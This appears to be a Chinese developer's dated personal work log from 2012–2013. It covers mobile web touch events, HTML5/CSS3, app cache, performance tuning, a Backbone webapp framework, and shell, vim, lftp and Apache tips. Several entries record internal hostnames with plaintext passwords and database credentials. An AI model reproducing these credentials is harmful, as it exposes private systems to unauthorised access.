2. 阻止滚动，阻止touchmove事件。浏览器默认动作如内容拉完以后的回弹效果等，这些会影响多点触摸应用的体验效果，需要阻止。
document.body.addEventListener('touchmove', function(event) {
  event.preventDefault();
}, false);
使用iscroll也需要阻止touchmove
3. 渲染效率。单指可以直接渲染。多指可以先记录，再启动定时器渲染，以提高渲染效率。如下60fps渲染器。
var touches = []
canvas.addEventListener('touchmove', function(event) {
  touches = event.touches;
}, false);

// Setup a 60fps timer
timer = setInterval(function() {
  renderTouches(touches);
}, 15);
如果现代浏览器支持的话，requestAnimationFrame比setInterval更佳。后者不考虑浏览器的渲染循环（rendering loop）。
function anim(time){
    requestAnimationFrame(anim);
    renderTouches(touches);
}

4. 利用targetTouches和changedTouches，得到更好的控制效果。

触摸APP开发工具：不易在桌面浏览器中直接调试。但也有一些工具，单点触摸，chrome浏览器19版以上可以支持模拟。多点触摸，可以用MacBook的触控板模拟，配合MagicTouch.js的polyfill。

多点触摸的DEMO： http://paulirish.com/demo/multi
http://paulirish.com/demo/这里还有不少其他demo

Magictouch：https://github.com/borismus/MagicTouch.git
关于多点触控的说明和demo。
tracker.html
domdrag.html等
已经部署在本地。

苹果在iOS2.0引入了触摸事件API，Android随后跟上。现在W3C有个工作组负责制定触摸事件的标准。

iPhone的高清屏，达到325-330ppi，原来的3GS已经够高了，为什么还要升到这个级别。原因是Apple希望其产品的屏幕效果接近打印效果（600dpi），从屏幕上几乎看不出点阵的效果，也即视网膜屏。http://daringfireball.net/2010/04/why_960_by_640

屏幕分辨率的提升，对开发者来说基本没有影响。

Google插入了一个层，叫做dips，device-independent pixels。该层处于公布的屏幕尺寸和开发者关注的CSS像素之间。

Nexus One，在portrait模式下，屏幕宽度为480px，但若使用viewport的meta标签后，其对应CSS像素为320px。

news中控机：tc-news-sub0.tc
登录以后，转成rd帐号：sudo -iu rd


2012/8/13
WHATWG的BLOG：http://blog.whatwg.org/
HTML Living Standard 和W3C HTML5
The Web Hypertext Application Technology Working Group （WHATGW），Web超文本应用技术工作组

Modernizr，js库，检测浏览器的HTML5和CSS3特性。
http://modernizr.com/
使用Modernizr对象的属性来标识是否支持。三大类，CSS3特性（例如Modernizr.fontface），HTML5特性，其他杂项特性。
按需加载机制，Modernizr.load()方法
特性检测用例：
if (Modernizr.webgl){
   loadAllWebGLScripts(); // webgl assets can easily be > 300k
} else {
   var msg = 'With a different browser you’ll get to see the WebGL experience here: \
            get.webgl.org.';
   document.getElementById( '#notice' ).innerHTML = msg;
}
http://modernizr.com/download/，自行进行代码拼装，支持只选择需要的特性。压缩格式与非压缩格式也可选。
twitter，google，MS等都在用。

link标签，rel=alternate与type一起使用，表示同样内容的另一种格式：
rss内容：
<link rel="alternate" type="application/rss+xml" title="百度国内焦点新闻（RSS 2.0）" href="http://news.baidu.com/n?cmd=1&class=civilnews&tn=rss">
样式表：
<link rel="stylesheet" href="static/css/index_shitu.css?v=1.9.2.css" />

关于link标签：
http://blog.whatwg.org/the-road-to-html-5-link-relations

跨设备MVC。
 

Ember也是一个MVC框架，类似Backbone

看看这个地址，公司打不开： http://slidfast.appspot.com/slide-flip-rotate.html

localStorage使用UTF-16编码，每个字符用两个字节保存。最多只能存2.5M的内容。

Safari不允许从一个document中将一个DOM节点移动到另一个document，可以选用adoptNode方法。

CSS像素与屏幕像素不一定是一致的。
http://www.quirksmode.org/blog/archives/2010/04/a_pixel_is_not.html
A pixel is not a pixel is not a pixel
这标题该怎么翻译？
一般来说，PC上CSS像素和屏幕像素是一致的。
移动设备上，特别是高清屏的设备，就不一致了。这其中有一个换算关系。3GS屏幕像素宽度320px，css设置320px刚好占满整个屏幕；iPhone4屏幕像素宽度为640px，css设置320px也刚好占满整个屏幕，也即css的1个像素对应屏幕的4个像素。

通过meta标签设置viewport，将其width设置为device-width，使视窗大小和屏幕宽度刚好对应，文本以最适宜的方式展示，你不会发现同样字号的字体，3GS比iPhone4显示的要大。

media-query的device-width以及viewport的device-width都是以屏幕像素为单位的。
但是iPhone中，viewport的width直接设为css像素，320px，也同device-width的效果。需要再确定一下。
2012/8/8
X-UA-Compatible meta属性，ie8以上支持。
http://lightcss.com/add-x-ua-compatible-meta-to-your-website/
Client side:
<meta http-equiv="X-UA-Compatible" content="chrome=1">
Server side:
X-UA-Compatible: chrome=1

History API:
history.pushState
event: popstate
http://slides.html5rocks.com/#history-api

Element.classList：
.add, .remove, .toggle, .contains, .toString

data-*：Element.dataset属性
var html = [];
for (var key in el.dataset) {
  html.push(key, ': ', el.dataset[key], '<br>');
}


新的选择器支持API：
getElementsByClassName
querySelector
querySelectorAll

-webkit-animation与@-webkit-keyframes配合使用

-webkit-transition: margin-left 1s ease-in-out;

时间线函数
Value   Description
linear
匀速    Specifies a transition effect with the same speed from start to end (equivalent to cubic-bezier(0,0,1,1))
ease
慢入慢出    Specifies a transition effect with a slow start, then fast, then end slowly (equivalent to cubic-bezier(0.25,0.1,0.25,1))
ease-in
慢入    Specifies a transition effect with a slow start (equivalent to cubic-bezier(0.42,0,1,1))
ease-out
慢出    Specifies a transition effect with a slow end (equivalent to cubic-bezier(0,0,0.58,1))
ease-in-out
慢入慢出    Specifies a transition effect with a slow start and end (equivalent to cubic-bezier(0.42,0,0.58,1))
cubic-bezier(n,n,n,n)   Define your own values in the cubic-bezier function. Possible values are numeric values from 0 to 1


与requestAnimationFrame的关联。
CSS3
草案阶段    CSS属性的变换：
transition（CSS可animatable属性从初始状态到末了状态的变化，支持时间函数，控制变化方式）

animation（支持关键帧技术，以及帧间变换）

坐标空间相关变换（2d/3d，位置、尺寸）：
transform（改变元素在坐标空间中的位置和尺寸，使用transform属性，元素可以在2D或3D坐标空间中被移动、旋转、缩放。与SVG的关系） 操作已有内容

页面内某个DOM元素的操作，比如大小、位置、颜色、方向等的变化，针对CSS支持的属性。用于网页内容展示优化。
Canvas
草案阶段
2012-03-29  提供js绘图API。线条、矩形、填充、图片绘制、像素操作。

<canvas> 标记和 SVG 以及 VML 之间的一个重要的不同是，<canvas> 有一个基于 JavaScript 的绘图 API，而 SVG 和 VML 使用一个 XML 文档来描述绘图。
这两种方式在功能上是等同的，任何一种都可以用另一种来模拟。从表面上看，它们很不相同，可是，每一种都有强项和弱点。例如，SVG 绘图很容易编辑，只要从其描述中移除元素就行。
要从同一图形的一个 <canvas> 标记中移除元素，往往需要擦掉绘图重新绘制它。    绘制内容

使用提供的JS绘图API进行图形绘制，动态生成内容。线条、形状、填充、图片绘制、像素操作等。用于在网页中动态生成新的内容。
SVG 用XML来绘制图形。功能与Canvas对等。

不属于HTML5规范的内容。
    用XML绘制内容。

和HTML的结合，可以通过object标签引入，或者内联方式。


CSS3： multi-column，一个列的内容可以延伸至另外一个列。
http://www.w3.org/TR/css3-multicol/
iOS3.2+，Android2.1+开始部分支持，没有全支持。

gradient，颜色渐变
文本阴影、盒阴影。text-shadow, box-shadow

HTML5 Slide： http://slides.html5rocks.com/

HTML5
新标签：section、article、aside、hgroup、header、footer、nav、figure、figcaption
video、audio、track、embed、mark、progress、meter、time、ruby、rb、rt、bdi、wbr、canvas、command、details、summary、datalist、keygen、output
input的new type（tel、search、url、email、datetime、date、month、week、time、datetime-local、number、range、color）
怎么使用？

新属性：23个

新全局属性：
contenteditable、contextmenu、data-*、draggable、dropzone、hidden、role、aria-*、spellcheck、translate

改变了的标签：
14条

改变了的属性：
27条

废弃的标签：
basefont、big、center、font、strike、tt
frame、frameset、noframes不在HTML5中，因为它们损害了可用性
acronym、applet、isindex、dir

废弃的属性：
14个使用建议；22个可视属性不再使用，因为用CSS实现更好

2012/8/7
https://developers.google.com/?hl=zh-CN
Google开发者社区

http://www.mobileawesomeness.com/，介绍一些移动站点：

http://m.agencecare.com/app 一系列引导，最终拨打电话。
http://www.basilgloo.com/mobile.html 个人设计工作展示
http://www.ampersandrew.com  个人介绍主页
http://m.basf.com/group/corporate/mobile/en/ 化工公司的主页，总部在德国。多页面

WebKit Remote Debugging：
http://www.webkit.org/blog/1620/webkit-remote-debugging/

Google的性能优化：https://developers.google.com/speed/articles/mobile?hl=zh-CN
Make the Web Faster

Make your pages and applications accessible to mobile
    PC版提供无线版的链接
    使用传统的URL，比如m.yoursite.com
    适应移动设备的UI界面
    考虑不同移动浏览器
Reduce the number of requests and the amount of data transferred
    CSSSprite或者data-url
    最小化代码
    减少重定向
    延迟资源加载（lazy）
Take advantage of new features in HTML
    appcache
    css3尽可能取代图片背景
    代码尽可能简单
Test, test test
    Testing resources:
•   Android Emulator以后装起来试试，不知是否能单独安装。可以命令行启动
•   BlackBerry Device Simulators 
•   iPhone
•   Opera Mini Simulator
•   Palm Pre
•   Windows Mobile
•   User Agent Switcher extension for Firefox. Switch your desktop user agent to quickly test how a page may behave behind a different user agent.
•   Page Speed Firefox/Firebug Addon. Evaluate a web page's performance and receive suggestions on how to improve it.

2012/8/6
删除.svn目录
find . -type d -name “.svn” -exec rm -rf {} \;

diff命令去除空白字符，或者换行符的影响
diff -r -w dira dirb
diff -r --strip-trailing-cr dira dirb
不包含.svn目录，只列出差异文件
diff -r --strip-trailing-cr -x \.svn -q dir dirb

touchmove与mousemove的区别。前者隐含了touchstart事件，后者不一定隐含mousedown事件。前者肯定是drag，后者不一定是drag。

drag的思想，鼠标或触摸点位置的变化反映到元素位置的变化。deltaX, deltaY的计算。

drag时，offset的值用于修正位置。相减得到offset的两个值具有同样的变化趋势。

clientX视窗的X轴坐标，不包含任何滚动偏移
pageX视窗的X轴坐标，包含滚动偏移
screenX 屏幕的X轴坐标
2012/8/2
zepto官方文档：http://zeptojs.com/

offsetWidth属于CSS的CSSOM View Module，可以在这里查看到：http://www.w3.org/TR/2011/WD-cssom-view-20110804/

关于CSSOM View，更详细的：http://www.quirksmode.org/dom/w3c_cssom.html

absolute定位，相对于最近的offsetParent的内border
2012/7/26
MVC方案：
http://fe.baidu.com/doc/liu_yang/webapp_mvc.text

html标签的manifest属性，指定manifest文件。
<html manifest=”cache-manifest”>

参考：http://www.w3.org/TR/html5/offline.html

manifest MIME：  text/cache-manifest
格式：
空白行
注释，必须单独一行，以#开头，避免与URL混淆
段头：三种段（section）。CACHE、FALLBACK、NETWORK
段内数据

CACHE对应Explicit类型的段。
对资源的标识可以使用绝对路径，甚至是绝对URL。比如：
/main/home
/main/app.js
http://img.example.com/logo.png

文件必须以CACHE MANIFEST开头
没有指定段名的，为Explicit类型


可能包含多个相同的段，也可能有空段。

HTML5离线应用无法更新的定位与解决，来自腾讯一哥们
http://www.alloyteam.com/2012/01/html5离线应用无法更新的定位与解决/
 
vary: Accept-Encoding很重要
app cache与http cache(browser cache)有关系
Fetch the resource, from the origin of the URL manifest URL, with the synchronous flag set and the manual redirect flag set. If this is an upgrade attempt, then use the newest application cache in cache group as an HTTP cache, and honor HTTP caching semantics (such as expiration, ETags, and so forth) with respect to that cache. User agents may also have other caches in place that are also honored.
If the resource in question is already being downloaded for other reasons then the existing download process can sometimes be used for the purposes of this step, as defined by the fetching algorithm.
An example of a resource that might already be being downloaded is a large image on a Web page that is being seen for the first time. The image would get downloaded to satisfy the img element on the page, as well as being listed in the cache manifest. According to the rules for fetching that image only need be downloaded once, and it can be used both for the cache and for the rendered Web page.

增加vary: Accept-Encoding
http://www.falconhan.com/webanalytics/vary-accept-encoding-header.htm
vary: Accept-Encoding，和代理服务器有关，需要考虑不接受某些编码的浏览器。
针对Apache .htaccess的：将以下代码插入根目录下的.htaccess文件
<IfModule mod_headers.c>
<FilesMatch ".(js|css|xml|gz)$">
Header append Vary Accept-Encoding
</FilesMatch>
</IfModule>


离线应用：http://www.w3.org/TR/html5/，找到5.6 Offline Web applications
cache = window . applicationCache
cache = self . applicationCache
cache . status
cache . update()
cache . abort()
cache . swapCache()
window . navigator . onLine


2012/7/25
transform: webkit核心，坐标系相关值的变换。
-webkit-transform: translate(80px, 80px) scale(1.5, 1.5) rotate(45deg)
肖广的demo展现方式不错。

多点触控开发最佳实践：http://www.html5rocks.com/en/mobile/touch/

statcounter：
浏览器相关统计：http://gs.statcounter.com/

statcounter快速代码：
    <div id="browser_version-CN-monthly-200901-201207" width="600" height="400" style="width:600px; height: 400px;"></div><!-- You may change the values of width and height above to resize the chart --><p>Source: <a href="http://gs.statcounter.com/#browser_version-CN-monthly-200901-201207">StatCounter Global Stats - Browser Version Market Share</a></p><script type="text/javascript" src="http://www.statcounter.com/js/FusionCharts.js"></script><script type="text/javascript" src="http://gs.statcounter.com/chart.php?browser_version-CN-monthly-200901-201207"></script>

百度提供的浏览器份额，流量研究院：
http://tongji.baidu.com/data/browser
2012/7/24
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black">
用于iOS webapp支持

<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
视窗meta

<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
文档内容类型、编码声明

<meta http-equiv="X-UA-Compatible" content="chrome=1">
ie8新支持meta

<style type="text/css" media="all">
支持media属性，这个在HTML5和CSS3已经支持。
<link rel="stylesheet" media="print" href="printer.css">

touch events事件
有4个事件：w3c相关，属于Javascript APIs下的Touch Events
touchstart
touchend
touchmove

w3c规范还提供了另外3个事件：touchenter, touchleave, touchcancel
所测试的Android 2.3, iOS4.2都不支持。但这些都支持touchstart, touchmove和touchend事件。但是都还不支持radiusX, radiusY, rotationAngle。

每个触摸事件都包含3个触摸列表：
touches: 当前在屏幕上的手指列表
targetTouches: 在当前DOM对象上的手指列表
changedTouches： 当前事件中涉及的手指列表。例如在touchend事件中，该列表包含了被移走的手指列表。

以上列表由包含触摸信息的对象组成，有如下触摸信息：
identifier: 唯一标识一个触摸的数字
target: 触摸的DOM对象
client/page/screen坐标：触摸点在屏幕上的位置
半径坐标和旋转角度：描述触摸点形状的椭圆。


iScroll使用需要将touchmove事件禁用，常用
document.addEventListener('touchmove', function (e) { e.preventDefault(); }, false);

querySelector API已经支持
http://www.w3.org/TR/2012/WD-selectors-api2-20120628/
pullDownEl.querySelector('.pullDownLabel').innerHTML = 'Pull down to refresh...';
其他还有：
querySelectorAll
find
findAll
matches

ender.js是一个js模块管理框架，应该类似seajs

2013/2/21
webapp framework的一些规则：
1.  视图（Backbone.View）实际上对应mvc中c的职责，而v的职责则由template担当。后续提及的视图实际是controller
2.  父视图负责创建子视图，子视图仅由父视图创建，不进行跨级创建（分而治之）
3.  子视图负责创建对应的model或collection
4.  视图分为页面视图和子视图，页面视图为顶级视图，不存在父视图，而子视图必须挂在某个父视图下；页面视图创建必须提供action参数，子视图创建必须提供parentView参数
5.  页面视图作为根视图，担任页面控制器和页面事件中心的角色，为页面内部模块提供消息耦合机制（松耦合）
6.  init用于初始化，此时视图不展现；init完毕后调用registerEvents进行事件注册
7.  需要区分全局loading（应用加载等待）和页面loading（数据加载等待）
2013/2/4
红吉测试机，修改外网域名transmit： http://rdtest.news.baidu.com
work@tc-news-mpi11.tc:~/search/
dir: /home/work/search/conf/transmit/transmit.conf
pwd: qwer1234
reload: /home/work/search/loadSE
2013/2/1
git help只列出了最常用的命令，比如git config就没有列出。要查看git路径配置，可以使用：
git config -l

百度知道PageBuilder：
http://nsfe.baidu.com  test:test

2013/1/30
sed高级替换：
sed -r -e "/@/ r database.ini" a  # a文件中@后面，添加database.ini文件的内容
sed -r -e "/@/,+1 d" a  # a文件中@所在行及后面紧跟的一行，进行删除操作

<META NAME="MobileOptimized" CONTENT="240"> 用于告知浏览器，不要再做移动站点优化

http://www.regular-expressions.info/posix.html
Linux命令说明中，BRE和ERE的区别。BRE： POSIX Basic Regular Expressions,  ERE: POSIX Extended Regular Expressions
POSIX定义了操作系统的标准集合，其中就定义了两种正则表达式的标准。BRE定义的就是传统grep命令使用的正则，大部分的特殊字符需要用反斜线作为前缀，导致正则表达式很长；而ERE正好相反，它对反斜线的使用进行了限制，对非特殊字符添加反斜线前缀视为错误。
BRE：对于特殊字符 [].*^$ ，直接有特殊含义，字面值需用反斜线转义；其他特殊字符都需要反斜线前缀，如 {}?+() 以及反向引用\1-\9。不再支持其他特性，甚至|也不支持。
ERE：同egrep使用的正则，扩展（Extended）的含义相对于原来的grep。ERE支持ERE支持的 [].*^$ ，同时还支持其他不需要反斜线的特殊字符，就像现代正则一样，对一个非特殊字符进行反斜线前缀转义视为错误。这些新增的不需转义的特殊字符有 ?+{}() ，同时有些实现中\1-\9也支持，不过这不是ERE扩展的内容。纯ERE现在已经用的很少了（应该大部分是eERE^_^）。ERE默认进行最长匹配，使用DFA，而不是最短匹配的NFA。
2013/1/29
sed的正则，不支持\d，支持[0-9]，但是vim支持
sed -r -i -e 's/(cmsescape:":json")\|(cmsescape:":[0-9]+":"\.\.\.")/\2|\1/g'
2013/1/26
文件比较如果只是需要看是否identical，可以直接md5sum一下：
find ./lib -type f | xargs md5sum

lftp：
进入命令行模式以后，可以直接按tab键，列出支持的命令。通过help cmd，可以查看命令帮助
lftp mirror：
-x与-i选项支持扩展正则表达式，目录名应以/结尾，匹配的是全路径，需要写精确，避免误伤
-X与-I选项不支持正则，只支持通配符，匹配的是全路径
以上选项都可以多次指定，好文：http://www.cyberciti.biz/faq/lftp-command-mirror-x-exclude-files-sub-directory-syntax/
例如： mirror -P -x "^((pages|lib|util)\.[^/]+|class)/$" -X *.tar -X *.tpl -X *.bz2

mirror正则支持[0-9]，但貌似不支持\d

-x "^[^/]+/$" 不包含一级子目录及子目录下所有文件，但包含一级文件
-x "^[^/]+/?$" 所有文件都不包含
也即指定目录，则会自动包含其下所有文件。
mirror --just-print -P -n -e -x "^[^/]+/?$" -i "^compactnews/.*$" 镜像compactnews目录
mirror --just-print -P -n -e -x "^[^/]+/?$" -i "^compactnews/.+$" 不镜像任何文件，因为目录本身没被包含

mirror --just-print -P -n -e -x ".*" -i "^compactnews/.*$" 镜像compactnews目录
mirror --just-print -P -n -e -x ".*" -i "^compactnews/$"  镜像compactnews目录，但不包含子目录和文件
mirror --just-print -P -n -e -x "^[^/]+/?" -i "^compactnews/$" 镜像compactnews目录
2013/1/25
vstuiguang mis系统：
地址：http://imis.baidu.com:8888/

newsrenwu二次开发测试地址：
http://tc-apptest-cms03.tc.baidu.com:8000/
线下数据库配置：
+    var re_addr = "10.237.2.31";
+    var re_user = "news";
+    var re_psw = "MhxzKhl";
+    var re_port = "6603";
熊雄：但是遇到过这个问题，在插入数据的时候把所有字段都指定为string插入的，结果主库是能成功插入，但是从库一更新就更新成错误的值了

2013/1/24
子视图的添加方式：prepend、append、setup需要同时支持
2013/1/23
zeptojs: http://zeptojs.com
backbonejs: http://backbonejs.org
backbone从Rails衍生而来。backbone的View与MVC的V不是一一对应，其更像是一个UI的概念，更多是controller的工作，而其中的html template才是担当V的角色。所以没有必要再搞一个controller出来。
backbone是一个库，而不是一个框架。

我们的webapp需要实现一个框架，所以需要在backbone基础上做一些工作，提供一些规范和约束。
1.  并行开发，页面独立
2.  分而治之，控制器树
3.  事件范围限定，页面事件中心

  var View = Backbone.View = function(options) {
    this.cid = _.uniqueId('view');
    this._configure(options || {});
    this._ensureElement();
    this.initialize.apply(this, arguments);
    this.delegateEvents();
  };
2013/1/22
mvc框架：
1.  更细的规范
2.  渲染方式

app.view: 继承自Backbone.View
    重写：initialize
    新增：init, getId, _config, hasChild, getChild, notice, getRoot, showLoading, hideLoading, append, destroy, registerEvents, unRegisterEventsh

app.router: 继承自Backbone.Router
    重写： initialize, routers
    新增属性： pageOrder
    新增方法： doAction, switchPage, 

fis的start.sh在db-news-fe2.vm机器上启动服务器失败，须将启动脚本换成以下的：
java -Djava.nio.channels.spi.SelectorProvider=sun.nio.ch.PollSelectorProvider -jar "client/FIS-Client.jar"
2013/1/17
vim跳至指定列，number| ，比如5|，跳至第5列

Linux帮助文档，转换成文本文件，需要将特殊格式的链接字符替换掉：
1.  vim
:%s/_\%x08\|\%x08.//g
2.  sed
sed -i -r -e "s/_\x08|\x08.//g" awk-help.txt
3.  直接输出：
man awk | sed -r -e "s/_\x08|\x08.//g" > awk-help.txt

vim pattern: 
\c用于匹配时ignore case，写在后面，如name\c
\C case sensitive，写在后面，如name\c
\m 启动magic模式，影响后面的字符，如\m\(\)
\M 关闭magic模式，影响后面的字符

2013/1/16
webapp引导至itunes下载，除了用http而不用https之外，还有可以直接用：itms-app://协议方式：itms-apps://itunes.apple.com/WebObjects/MZStore.woa/wa/viewSoftware?id=588287777

getLocalStorageSize:
(function(){function getByteSize(str){return escape(str).replace(/%u.{4}/g, '@@').replace(/%.{2}/g, '@').length;}var storage = window.localStorage,key = null, item = null,size = 0;for(var i=0; ; i++){key = storage.key(i);if(null === key){break;}item = storage.getItem(key); size += getByteSize(item);}return size;})();
2013/1/15
svn列出某个路径下的内容：
svn ls target

fis-webapp bugs：
1.  src, href等的内容替换，正则不够精确，使template内部的src被替换
2.  manifest文件自动时间戳不支持
3.  manifest文件不被识别为文本文件，导致无法replace
4.  manifest文件内部的引用没有被解析
5.  fis-inline功能不能在模板（script）内部，原因是script不够精确
6.  gmu import不进来，即使放在最后，仍然有list未去重的问题
7.  直接引css文件，css文件引用的图片等资源没有生成对应md5格式的文件
8.  fis添加性能监控脚本不支持

使用F.load，代码中的window.addEventListener(‘load’, …)可能不起作用，需使用$(function(){…})
2013/1/14
http://ivomynttinen.com/blog/the-ios-design-cheat-sheet-volume-2/
ios开发小抄，屏幕分辨率、ppi、icon像素、状态栏高度等。
2013/1/12
ios设备上推广itunes链接，最好使用http协议，而非https协议，后者在非原生浏览器中可能调不起app store
2013/1/10
fis-inline支持递归，但是如果放在script标签里，则不生效。可以修改webapp-1.3.4\syntaxs\HtmlSyntax.class.php中的正则，缩小script解析的范围，使前端模板不被解析。
$this->tpl_style_script_anaylse_reg = self::getRegExp(array(
    // '(\<script\b[^>]*\>)([\s\S]*?)(\<\/script\s*\>)',   //1(2,3,4)
    '(\<script\b(?:\s*|[^>]+?text\/javascript[^>]+)\>)([\s\S]*?)(\<\/script\s*\>)',   //1(2,3,4)

点餐地址：http://ele.me/hd_xxmtf

FIS：自动预览模式和编译后预览模式有区别，后者不能使用test.baidu.com这种fake域名（修改本地hosts文件）
2013/1/9
使用pkg管理webapp的模块，风险较大：
1.  溢出：抽样需要多套并存但又互不影响，更新会使一些模块变成不再使用的包
2.  同域下，多产品线，key的互相不覆盖，难以保证。如果保证不了，就是灾难性后果


添加apache gzip压缩：
<IfModule deflate_module>
    AddOutputFilterByType DEFLATE text/js text/css text/html                                                                    
</IfModule>

news webapp:
html: 19.21K/4.45K
iphone.css: 269.19K/189.30K
common.js: 126.92K/40.02K
iphone.js: 75.13K/15.90K
index data: 66.32K/19.73K
popup layer image: 123.57K + 20.75K
image player: 27.11K + 36.97K + 76.58K + …
total: 579.25K

video webapp:
html: 15.46K/3.43K
iphone.css: 282.62K/191.78K
common.js: 128.43K/40.76K
iphone.js: 52.32K/14.99K
background image: 18.50K + 5.77K + 7.97K
popup layer image: 150.81K + 33.01K
image player: 40.08K + 39.05K + 84.97K
total: 645.14K

思路：缩短head time，使data request时间提前。
iphone.css改造之前：270K/189K，DOMCotentLoaded：1.03s，890ms，改造之后：59K/27K，DOMCotentLoaded：690ms。2G网络改善明显。
2013/1/8
css3属性查询：http://css-infos.net/property/-webkit-box-sizing 
修改最后字段为css属性名，将显示对应css属性说明。-webkit-box-align, -webkit-box-pack, -webkit-box-orient等。

iphone5和ios6给HTML5开发者：
http://www.mobilexweb.com/blog/iphone-5-ios-6-html5-developers 

iphone屏幕像素尺寸：
iphone3GS: 320 * 480
iphone4/4S: 640 * 960
iphone5: 640 * 1136

iframe对ios webapp启动界面的影响：
1.  不指定src，指定空src，指定about:blank src，指定javascript:void(0) src，都会使启动界面停留时间变短，在页面出来前出现空白。news和video的webapp都存在这个问题，原因是反馈页面的空iframe导致。
2.  指定src为#，可以不出空白，但也多了一次http请求
3.  解决办法为不在html直接写iframe，iframe在后续js运行过程中动态添加

调试器：
1.  iwebinspector，运行在mac os上
http://www.iwebinspector.com/
2.  ios6 web inspector，需要mac os上的safari 6配对支持，而safari 6没有windows版本
3.  weinre，只支持主动嵌入脚本的页面
2013/1/7
http://motype.org/2012/04/apple-touch-startup-image/
关于iOS启动图片

http://www.prower.cn/technic/2314
关于ios启动图片和桌面icon


window.navigator.standalone只读布尔值，用于判断是否ios的全屏模式

http://calendar.perfplanet.com/2012/make-your-mobile-pages-render-in-under-one-second/

1.  Google Analytics: 移动网页平均加载时间超过10s
人的注意力在等待超过1s以后就会被打断，所以太长的加载时间会让人不耐烦。所以，至少网页内容的渲染应该少于1s

2.  网络往返带来时间消耗，其来源：DNS解析，建立TCP连接，请求和响应等。

网络往返 -> HTML解析 -> DOM树 -> 渲染树 -> 渲染

3.  HTML解析可被阻塞：最主要为外部js和css。停止当前解析，引入额外网络往返，如果是它域情况，还得引入额外DNS和TCP网络往返。执行完请求回来的js或css，再继续当前HTML解析。

4.  总的说，提前加载的外部js和css是性能杀手。特别针对移动网络，网络往返时间更长，这种效应更加明显。

5.  建议：理想情况下，第一次传输数据在15K（gzip后）以内，将第一次展现需要的js和css内联。其他的在底部外联。

6.  另外重定向也有较大影响

7.  假设3G网络往返时间250ms，没有阻塞渲染的外联js和css，那么会有3次往返，分别为DNS，TCP和请求/响应，共为750ms，加上100ms的后端时间，总共为850ms。只要页面的大小为压缩后15K，解析渲染时间不会超过100ms，那么一个页面时间为950ms，不超过1s。

我们的优化：
2013/1/5
http://calendar.perfplanet.com/2012/make-your-mobile-pages-render-in-under-one-second/

2012/12/31
ios5+使用overflow:scroll; 代替 IScroll，存在一些问题：滚动区上拉会整体上拉；切换后，位置能保留，但是滚动时回复到顶部；滚动速度较慢，不可调。
2012/12/28
chrome extension，陈著：
manifest文件
客户端css和js，影响DOM，但不污染window对象，平行宇宙
manifest和content_script

API大部分都是异步：
chrome.windows.create()

百度浏览器前端判断：
var isbaidu= navigator.userAgent.match(/flyflow\/(\d+\.\d+)/i), minVersion= 2.4;
app.isBAIDU= isbaidu && !isNaN(isbaidu[1]) ? isbaidu[1] >= minVersion : false;
2012/12/27
windows 7设置wlan hostednetwork：
http://hi.baidu.com/suxinpingtao51/item/aac30a1a92600eee9913d601
启动承载网络，WiFi热点。

1.  netsh使用wlan上下文：
netsh wlan set hostednetwork mode=allow ssid=258iWifi key=1234056789

网络连接中出现Microsoft Virtual WiFi Miniport Adapter，虚拟wifi适配器。

2.  设置本地连接（非wifi）的共享，使其可以共享给虚拟wifi连接。

3.  启动hostednetworkd：
netsh wlan start hostednetwork

注意：若出现“组或资源的状态不是执行请求操作的正确状态”，请注意以下无线网卡是否被其他连接占用。

通过HTML5的canvas可以实现前端图片压缩： http://houpeng.fe.baidu.com/face/canvas.html

2012/12/26
sproutcore：
statechart，状态：LOADING、LOADED、LOGGED_IN、LOGGED_OUT
创建含状态图的应用：
$ sproutcore gen startchart_app TodosTwo

svn log遇到中文乱码，可以设置LANG环境变量，根据SecureCRT设置适当的值，比如：
export LANG=zh_CN.utf-8
2012/12/25
sproutcore： http://guides.sproutcore.com/getting_started.html 

ruby下载： http://rubyinstaller.org/downloads/
cygwin下载： http://www.cygwin.com/

2012/12/24
Linux下如何解包但不安装rpm包： $rpm2cpio *.rpm | cpio -id

unoconv: Universal Office Converter，Python实现，站点：http://freecode.com/projects/unoconv

/(?:)/g也是一个正常js RegExp


2012/12/21
fiswebapp部署：
index.html： HTML入口
loader.js： 文件加载，配置成inline，还需要修改server地址
pkg： 部署php包
2012/12/20
windows hosts文件：C:\WINDOWS\system32\drivers\etc\hosts

2012/12/18
fis问题：
支持更多文件类型：manifest, bat等
api文档视图，有点鸡肋
ui文件
命令行方式
common和product怎么分
**什么意思，*不行么？

输出index.html
2012/12/17
mysql用户定义变量，使用set语句，@前缀。
存储过程中的本地变量，使用declare语句，只能放在begin..end间。
select into var; var只能用用户定义变量。
2012/12/16
用户名和密码同时提供，连接mysql： mysql -uroot -proot

ERROR 1074 (42000) at line 29: Column length too big for column 'title' (max = 255); use BLOB or TEXT instead
mysql，固定字符串字段，最长字符数255，若超出则使用BLOB或TEXT格式。
2012/12/14
C++编码规范：http://wiki.babel.baidu.com/twiki/bin/view/Com/Main/CPP

2012/12/13
Apache日志配置：
打印某个cookie值，用%{key}C表示，日志中会打印名为key的cookie
打印Apache输出的日志，用于标识唯一用户，用%{cookie}n表示
打印每个请求的输入输出字节数，需启用mod_logio模块，使用%I和%O表示输入输出。

Apache2.4.2安装（对于apr、apu以及pcre库自定义的情况）：
./configure --prefix=/home/work/hudamin/apache2.4.2 --enable-so --enable-deflate --enable-usertrack --enable-sed --enable-dav --with-apr=/home/work/svn/apr-1.4.2/bin/apr-1-config --with-apr-util=/home/work/svn/apr-util-1.3.9/bin/apu-1-config --with-pcre=/home/work/softwares/pcre


2012/12/11
webapp使用iframe嵌套视频资源的调研：
调研结论：
只播放H5资源的页面可以一试，但由于跨域问题，存在无法控制是否自动播放的问题，自身网站的内容可能由于自动播放用户看不到

测试DEMO地址（iOS和Android皆可访问）：http://db-news-fe2.vm.baidu.com:8081/ios/#video_iframe

具体如下：
H5资源页面（能播放，但无法控制其自动播放与否）：
Ios系列能播放，但整体展现和操作效果不佳，跨域不能对iframe进行控制，内容是否自动播放取决于第三方，iframe周边内容容易被略过。
Android测试能播放，测试平台为2.3.6

非H5资源页面（建议不要支持，体验不好，技术上也难以支持）
Ios4及以下，页面不能通过滑动或者缩放整体看到，用户无法操作视频播放
Ios5及以上，页面可以通过滑动整体看到，也可以操作
Android 2.3，页面可以滑动，但某些区域比如视频区域不能滑动，影响用户，通常提示安装Flash插件


隐藏元素，不会触发webkitTransitionEnd事件，webapp产品页为例
